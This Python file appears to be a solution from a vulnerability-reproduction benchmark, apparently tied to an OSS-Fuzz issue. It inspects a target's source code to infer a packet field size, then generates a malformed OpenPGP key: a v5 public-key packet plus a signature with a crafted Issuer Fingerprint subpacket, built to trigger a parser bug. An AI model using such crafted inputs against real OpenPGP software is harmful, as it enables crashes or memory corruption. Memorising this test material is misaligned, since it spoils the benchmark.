import os
import re
import tarfile
import struct
import hashlib
from typing import Iterator, Tuple, Optional


def _iter_files_from_dir(root: str) -> Iterator[Tuple[str, bytes]]:
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".rs", ".go", ".java", ".py")
    total = 0
    limit = 40 * 1024 * 1024
    for dirpath, _, filenames in os.walk(root):
        for fn in filenames:
            lfn = fn.lower()
            if not lfn.endswith(exts):
                continue
            path = os.path.join(dirpath, fn)
            try:
                st = os.stat(path)
            except OSError:
                continue
            if st.st_size <= 0 or st.st_size > 2 * 1024 * 1024:
                continue
            if total + st.st_size > limit:
                return
            try:
                with open(path, "rb") as f:
                    data = f.read()
            except OSError:
                continue
            total += len(data)
            yield path, data


def _iter_files_from_tar(tar_path: str) -> Iterator[Tuple[str, bytes]]:
    exts = (".c", ".cc", ".cpp", ".cxx", ".h", ".hpp", ".hh", ".rs", ".go", ".java", ".py")
    total = 0
    limit = 40 * 1024 * 1024
    try:
        with tarfile.open(tar_path, "r:*") as tf:
            for m in tf.getmembers():
                if not m.isreg():
                    continue
                name = m.name
                lname = name.lower()
                if not lname.endswith(exts):
                    continue
                if m.size <= 0 or m.size > 2 * 1024 * 1024:
                    continue
                if total + m.size > limit:
                    return
                try:
                    f = tf.extractfile(m)
                    if f is None:
                        continue
                    data = f.read()
                except Exception:
                    continue
                total += len(data)
                yield name, data
    except Exception:
        return


def _iter_source_files(src_path: str) -> Iterator[Tuple[str, bytes]]:
    if os.path.isdir(src_path):
        yield from _iter_files_from_dir(src_path)
    else:
        yield from _iter_files_from_tar(src_path)


def _infer_v5_pubkey_len_field_size(src_path: str) -> int:
    score_0 = 0
    score_2 = 0
    score_4 = 0

    rx_version5 = re.compile(r'\bversion\b[^;\n]{0,80}(?:==|>=)\s*5\b', re.IGNORECASE)
    rx_v5 = re.compile(r'\bV5\b|\bPGP_V5\b|\bOPENPGP_V5\b', re.IGNORECASE)
    rx_key_pkt = re.compile(r'\b(public|pub)\s*key\b|\bkey\s*packet\b', re.IGNORECASE)
    rx_mat_len_txt = re.compile(r'\b(material|key)\s*(?:data|material)?\s*length\b', re.IGNORECASE)
    rx_uint16 = re.compile(r'\buint16_t\b|\bu?int16\b|\bu16\b', re.IGNORECASE)
    rx_uint32 = re.compile(r'\buint32_t\b|\bu?int32\b|\bu32\b', re.IGNORECASE)
    rx_read16 = re.compile(r'\b(read|get|load|parse)\w*\s*\(\s*[^)]*\b(u?int16|uint16_t|u16)\b', re.IGNORECASE)
    rx_read32 = re.compile(r'\b(read|get|load|parse)\w*\s*\(\s*[^)]*\b(u?int32|uint32_t|u32)\b', re.IGNORECASE)

    rx_decl_len16 = re.compile(r'\buint16_t\s+\w*(?:material|key)\w*len\w*\b', re.IGNORECASE)
    rx_decl_len32 = re.compile(r'\buint32_t\s+\w*(?:material|key)\w*len\w*\b', re.IGNORECASE)

    rx_no_len_hint = re.compile(r'\b(v4|version\s*4)\b[^;\n]{0,120}\b(same|identical)\b[^;\n]{0,120}\b(v5|version\s*5)\b', re.IGNORECASE)

    for _, raw in _iter_source_files(src_path):
        try:
            s = raw.decode("latin1", errors="ignore")
        except Exception:
            continue

        if rx_no_len_hint.search(s):
            score_0 += 2

        if rx_decl_len16.search(s):
            score_2 += 3
        if rx_decl_len32.search(s):
            score_4 += 3

        for m in rx_version5.finditer(s):
            w = s[m.start(): m.start() + 800]
            if rx_mat_len_txt.search(w) or rx_key_pkt.search(w) or rx_v5.search(w):
                if rx_uint32.search(w) or rx_read32.search(w):
                    score_4 += 4
                if rx_uint16.search(w) or rx_read16.search(w):
                    score_2 += 4

        if "key material length" in s.lower() or "public key material" in s.lower():
            if "uint32" in s.lower() or "u32" in s.lower():
                score_4 += 2
            if "uint16" in s.lower() or "u16" in s.lower():
                score_2 += 2

    if score_4 > score_2 and score_4 >= 4:
        return 4
    if score_2 >= 2:
        return 2

    return 2


def _new_packet(tag: int, body: bytes) -> bytes:
    hdr0 = 0xC0 | (tag & 0x3F)
    l = len(body)
    if l < 192:
        return bytes([hdr0, l]) + body
    if l < 8384:
        x = l - 192
        return bytes([hdr0, 192 + (x >> 8), x & 0xFF]) + body
    return bytes([hdr0, 255]) + struct.pack(">I", l) + body


def _mpi_from_int(n: int) -> bytes:
    if n <= 0:
        return b"\x00\x00"
    bl = n.bit_length()
    nb = (bl + 7) // 8
    return struct.pack(">H", bl) + n.to_bytes(nb, "big")


def _mpi_from_bytes(b: bytes, bitlen: Optional[int] = None) -> bytes:
    if bitlen is None:
        i = 0
        while i < len(b) and b[i] == 0:
            i += 1
        if i == len(b):
            bitlen = 0
        else:
            bitlen = (len(b) - i - 1) * 8 + (b[i].bit_length())
    return struct.pack(">H", bitlen) + b


def _deterministic_modulus_1024() -> bytes:
    out = bytearray()
    seed = b"oss-fuzz:42537670:v5key:modulus"
    ctr = 0
    while len(out) < 128:
        h = hashlib.sha256(seed + struct.pack(">I", ctr)).digest()
        out.extend(h)
        ctr += 1
    out = out[:128]
    out[0] |= 0x80
    if all(x == 0 for x in out[1:]):
        out[1] = 1
    return bytes(out)


def _build_v5_public_key_packet(len_field_size: int) -> bytes:
    ver = 5
    ctime = 0
    algo = 1  # RSA
    n_bytes = _deterministic_modulus_1024()
    mpi_n = _mpi_from_bytes(n_bytes, 1024)
    mpi_e = _mpi_from_int(65537)
    keymat = mpi_n + mpi_e

    if len_field_size == 4:
        body = bytes([ver]) + struct.pack(">I", ctime) + bytes([algo]) + struct.pack(">I", len(keymat)) + keymat
    elif len_field_size == 2:
        body = bytes([ver]) + struct.pack(">I", ctime) + bytes([algo]) + struct.pack(">H", len(keymat)) + keymat
    else:
        body = bytes([ver]) + struct.pack(">I", ctime) + bytes([algo]) + keymat

    return _new_packet(6, body)


def _build_userid_packet() -> bytes:
    return _new_packet(13, b"a")


def _build_signature_with_issuer_fingerprint_v5() -> bytes:
    ver = 4
    sig_type = 0x13  # Positive certification (User ID)
    pubkey_algo = 1  # RSA
    hash_algo = 8    # SHA-256
    hashed_subs = b""
    unhashed_subs_payload = b"\x05" + (b"\x42" * 32)
    sub_type = 33  # Issuer Fingerprint
    sub_body = bytes([sub_type]) + unhashed_subs_payload
    sub_len = len(sub_body)
    if sub_len >= 192:
        subpkt = b""
    else:
        subpkt = bytes([sub_len]) + sub_body

    unhashed_subs = subpkt
    body = bytearray()
    body.append(ver)
    body.append(sig_type)
    body.append(pubkey_algo)
    body.append(hash_algo)
    body += struct.pack(">H", len(hashed_subs))
    body += hashed_subs
    body += struct.pack(">H", len(unhashed_subs))
    body += unhashed_subs
    body += b"\x00\x00"  # left 16 bits of hash
    body += b"\x00\x01\x01"  # minimal RSA signature MPI: 1 bit, value 1
    return _new_packet(2, bytes(body))


class Solution:
    def solve(self, src_path: str) -> bytes:
        len_field_size = _infer_v5_pubkey_len_field_size(src_path)
        pk = _build_v5_public_key_packet(len_field_size)
        uid = _build_userid_packet()
        sig = _build_signature_with_issuer_fingerprint_v5()
        return pk + uid + sig